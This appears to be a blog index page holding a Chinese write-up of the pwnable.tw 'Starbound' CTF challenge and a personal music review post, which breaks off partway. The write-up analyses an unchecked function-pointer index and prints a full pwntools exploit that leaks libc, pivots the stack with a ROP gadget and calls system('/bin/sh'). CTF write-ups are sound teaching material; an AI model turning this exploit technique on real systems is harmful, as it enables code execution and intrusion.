<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Cameudis&#39; Blog">
<meta property="og:url" content="https://www.cameudis.com/page/2/index.html">
<meta property="og:site_name" content="Cameudis&#39; Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Cameudis">
<meta property="article:tag" content="blog">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.cameudis.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Cameudis' Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Cameudis' Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Binary Hack, Computer System, Music, and whatever</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-notes">

    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/224d2c00b9a1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/224d2c00b9a1.html" class="post-title-link" itemprop="url">【Pwn#0x13】pwnable.tw Starbound writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-13 14:59:14" itemprop="dateCreated datePublished" datetime="2023-10-13T14:59:14+08:00">2023-10-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/224d2c00b9a1.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x13】pwnable.tw Starbound writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/224d2c00b9a1.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/224d2c00b9a1.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本题 neta 了星界边境，实现了一个简单的二维探索游戏。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/c/Projects/ctf_archive/[pwnable.tw]Starbound/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>数组下标未检查导致的任意控制流劫持。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    menu_func_ptr();</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">256u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))func_ptrs[v3])();          <span class="comment">// 数组index溢出！</span></span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 main 函数中，有一个对于函数指针数组的调用，index 数据来自于用户输入经 strtol 转化成的数字。我们可以用 <code>cmd_set_name</code> 函数修改 data 段的数据，再让程序 call 我们控制的地址，达成 arbitary call。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h3 id="ROP-方法"><a href="#ROP-方法" class="headerlink" title="ROP 方法"></a>ROP 方法</h3><p>有了任意调用，程序又没有开 PIE，接下来就是看看程序本体有哪些东西可以给我们来调用。<br>我在本体中，并没有找到 win 相关的函数，也没有找到导入的 system 符号，因此似乎没有简单的 ret2text 方法来完成一击必杀。</p>
<p>那就来打个 ROP 吧，我们可以直接用 main 函数 buffer 来存放 ROP 链，只要找一个类似于 <code>add esp, xxx; ret;</code> 的 gadget 即可。</p>
<p>使用这种方法，我们可以先用 <code>puts</code> 泄露 libc 基址，然后就能 <code>system(&quot;/bin/sh&quot;)</code> 了。具体利用见完整 EXP。<br>查 libc 版本用的是 <a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a>，俄罗斯那个（<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc.blukat.me</a>）查到的结果贼少，不知道为什么。</p>
<h3 id="路径穿越方法（存在利用条件限制）"><a href="#路径穿越方法（存在利用条件限制）" class="headerlink" title="路径穿越方法（存在利用条件限制）"></a>路径穿越方法（存在利用条件限制）</h3><p>ROP 方法是我不小心从网上看到的，唉我不应该上网查的。<br>不过我自己也想出了一个非常绝妙的利用，不需要用到 ROP！</p>
<p>我们已有的任意调用，其参数是固定好的，第一个参数是一个我们可控的字符串指针，第二个参数是 0。顺着这个思路，我们可以先看看程序本体中有哪些函数，其第一个参数是 <code>char*</code> 类型的。</p>
<p>首先，此类函数肯定是 printf 最常见也最好利用，我们可以用这种方法将任意调用宽展成任意读写，但程序开启了 FORTIFY 保护，里面甚至只有 <code>_printf_chk</code> 函数没有 <code>printf</code> 函数。两者的区别在于，后者其实是前者的一个 wrapper。<br>前者的第一个参数是一个安全等级，1 表示开启，0 表示关闭。当开启时，格式化字符串攻击将会被大大削弱，比如不能直接使用 <code>%n$d</code> 了，如果要用到这玩意，必须前面要有 <code>%1$d</code> <code>%2$d</code> … <code>%(n-1)$d</code> 这些。<br>因此，这条路走不通。</p>
<p>但我们就可以找到另外两个首个参数的—— <code>mkdir</code> 和 <code>open</code>。既然有 open，就可以想想是不是能 orw 把 flag 读出来。但是，程序的漏洞处，相邻的两次触发之间隔了许多个函数调用，这就不允许我们把 open 返回值暂时放在寄存器中，这里就很难进行下一步操作。</p>
<p>但是，我把整个 binary 都审了一边，发现了一个有趣的机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_enable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">socklen_t</span> len; <span class="comment">// [esp+2Ch] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+32h] [ebp-7Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">    close(fd);</span><br><span class="line">  addr.sa_family = <span class="number">1</span>;</span><br><span class="line">  fd = socket(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>);                         <span class="comment">// UDP</span></span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Error] Fail to enable&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>cmd_multiplayer_enable</code> 中，有对于一个全局变量 <code>fd</code> 的赋值。而我们知道，进程打开的第一个文件往往是接在 <code>stderr</code> 的后面，也就是 fd &#x3D;&#x3D; 3。<br>我们可以观察到，程序在使用 close 关闭 fd 之后，并没有清空 fd 的值，也就是这里依然是 3。实际调用这个函数，发现程序肯定可以走到关闭 fd 的代码。</p>
<p>我们查找 fd 的应用，可以找到这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_recvmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  v5 = getpid();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ask your friends to share their coordinates!&quot;</span>);</span><br><span class="line">  v0 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[Error] Transmission error :(&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buf[<span class="number">0</span>] = rotate_shift_add_decrypt(buf[<span class="number">0</span>], &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;[Info] Receiving (&quot;</span>);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(buf[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里程序将会尝试从 fd 中读取内容，每一个字节都使用 <code>rotate_shift_add_decrypt</code> 函数进行加密，然后打印出结果。</p>
<p>于是我们可以想到一条利用链：</p>
<ol>
<li>调用 <code>cmd_multiplayer_enable</code>，让 fd 被置为 3；</li>
<li>调用 <code>open</code> 函数打开 flag；</li>
<li>调用 <code>rotate_shift_add_decrypt</code>，读取加密后的 flag 并输出；</li>
<li>本地尝试暴力破解！</li>
</ol>
<p>但我们会遇到一个问题：虽然我们可以控制第一个参数这个字符串，但是其开头被限制了是一个数字，因为我们就是用这个数字当作数组下标来实现任意调用的。<br>为此，我想到了一种借用 <code>mkdir</code> 来加强 <code>open</code> 的方法：</p>
<ol>
<li>调用 <code>mkdir(&quot;-33\0&quot;)</code> 在当前目录创建名为 -33 的文件夹；</li>
<li>调用 <code>open(&quot;-33/../flag\0&quot;)</code> 打开任意目录下的 flag。</li>
</ol>
<p>在本地，这种方法是可行的。然而，远程环境中执行 binary 的路径是根目录，而进程并没有在根目录创建文件夹的权限，因此这种方法很遗憾地失效了 : (</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = process([filename])</span><br><span class="line">io = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10202</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    g = gdb.attach(io, <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        b *0x0804A65D</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 0x08048e48 : add esp, 0x1c ; ret</span></span><br><span class="line">    add_esp_1c_ret = <span class="number">0x08048e48</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        elf.symbols[<span class="string">&#x27;puts&#x27;</span>], elf.symbols[<span class="string">&#x27;_start&#x27;</span>], elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    mes = io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    libc_base = unpack(mes,<span class="number">32</span>) - <span class="number">0x5fca0</span></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment"># system_addr = libc_base + 0x49670 # printf</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        system_addr, elf.symbols[<span class="string">&#x27;_start&#x27;</span>], <span class="number">0x080580D0</span>+<span class="number">0x4</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret)+<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p><strong>函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。</strong><br>本漏洞修补十分简单，只需要加上一个检查就可以了。</p>
<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Daily/ff41d015749c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Daily/ff41d015749c.html" class="post-title-link" itemprop="url">【Music#0x01】纯个人向音乐鉴赏与推荐</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-17 16:05:26" itemprop="dateCreated datePublished" datetime="2023-09-17T16:05:26+08:00">2023-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-17 14:40:17" itemprop="dateModified" datetime="2024-04-17T14:40:17+08:00">2024-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Daily/" itemprop="url" rel="index"><span itemprop="name">Daily</span></a>
                </span>
            </span>

          
            <span id="/Daily/ff41d015749c.html" class="post-meta-item leancloud_visitors" data-flag-title="【Music#0x01】纯个人向音乐鉴赏与推荐" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Daily/ff41d015749c.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Daily/ff41d015749c.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本人对音乐、乐理、电音制作等知识皆一窍不通，就是个臭打鼓的。因此本条博客是一个<strong>纯个人向</strong>音乐鉴赏与推荐！</p>
<h3 id="Glitched-Universe-削除"><a href="#Glitched-Universe-削除" class="headerlink" title="Glitched Universe - 削除"></a>Glitched Universe - 削除</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=2080462661&userid=127208986">网易云</a><br>评语：世界纷繁错乱，但令人心潮澎湃的心愿永远存在。</p>
</blockquote>
<p><strong>[0:00 - 0:37 Build Up]</strong></p>
<p>从空灵的女声开始，不断快速切入各种声部，包括富有动感的DnB鼓，极光般的弦乐，更具Glitch色彩的音效……然后在最后一小节提前爆发切入DROP！</p>
<p><strong>[0:37 - 0:55 DROP]</strong></p>
<p>宇宙，<strong>世界的绚烂</strong>。背景中心电图般爬升而又落下的像素音，坚定的女声与电声主旋律（这个lead我很喜欢），共同构成了这一副<strong>绚烂</strong>的图景！<br>（我真的很喜欢绚烂这个词）</p>
<p><strong>[0:55 - 1:00]</strong></p>
<p>DROP同样在最后一小节提前结束切入下段，但没有给人任何的失落感，而是让前后的衔接更加紧密，真是优秀的设计！这里是一个激烈的过渡段，用劲爆的节奏来为DROP收尾。</p>
<p><strong>[1:00 - 1:24]</strong></p>
<p>一个铺垫段，glitch噪音一直在耳边回响。电声乐器重复着变强又破碎（glitch音）的过程，好似恒星爆发又突然时光倒带。</p>
<p><strong>[1:24 - 2:07 Build UP]</strong></p>
<p>在刚才的基础上，似乎有了些规则的出现。glitch噪音不再是噪音，而是如同01的数据流一般；同时引入了些许钢琴旋律。</p>
<p>随后，又引入了心电图般爬升而又落下的像素音，以及隐隐约约渐强的DnB鼓。同时，lead变为了带一些glitch的像素音。情绪逐渐加强!</p>
<p><strong>[2:07 - 2:13]</strong></p>
<p>在我以为正要进入DROP时，旋律和节奏都突然停下了，取而代之的是一个持续的Glitch BASS。这时我仿佛来到了空旷无人的宇宙中，不见空间也不见时间。<br>随着BASS逐渐加强，流星般落下的音效出现，时间和空间逐渐回归。然后，在最后一小节提前切入——</p>
<p><strong>[2:13 - 2:51 DROP]</strong></p>
<p>整首曲子情感的爆发，重复了两遍的DROP让人感动。<br>再一次见证<strong>世界的绚丽</strong>。</p>
<p><strong>[2:51 - 3:00]</strong></p>
<p>再次以激烈的节奏与电音为整首曲子收尾，让人意犹未尽，仍想再度踏上这次旅程。</p>
<h3 id="Holy-Night-Silent-Night-Dachs"><a href="#Holy-Night-Silent-Night-Dachs" class="headerlink" title="Holy Night, Silent Night - Dachs"></a>Holy Night, Silent Night - Dachs</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=526904317&userid=127208986">网易云</a><br>风格：trance<br>评语：神一般的间奏，让人感动，和专辑封面一样美哭</p>
</blockquote>
<p><strong>[0:00 - 2:30]</strong></p>
<p>开头仿佛是令人安心的冬夜，快要过圣诞了。抬头便可看到繁星流转于夜空。</p>
<p><strong>[2:30 - 3:15 breakdown]</strong></p>
<p>静谧的夜。情绪慢慢变得柔和，音乐逐渐无声……<br>柔和的钢琴响起，伴随着弦乐，仿佛回忆往昔时光，有着淡淡的伤感。</p>
<p><strong>[3:15 - 3:56]</strong></p>
<p>有力的钢琴伴随着诸多交响乐器逐渐加强，我们从回忆走出，镜头切换到身前，我们仿佛看到了奇迹——或是久别重逢、或者找回信仰。</p>
<p><strong>[3:56 - 5:29]</strong></p>
<p>极富力量感和动感的电音lead乐器将我们带回了现实，尽管主题是重复的，但这时的情感已经和 breakdown 之前不同了，这夜晚变得更加深沉。</p>
<p><strong>[5:29 - 6:29 Epilogue]</strong></p>
<p>尾声。</p>
<h3 id="Noctambule-＊-Teris"><a href="#Noctambule-＊-Teris" class="headerlink" title="Noctambule - ＊-Teris."></a>Noctambule - ＊-Teris.</h3><blockquote>
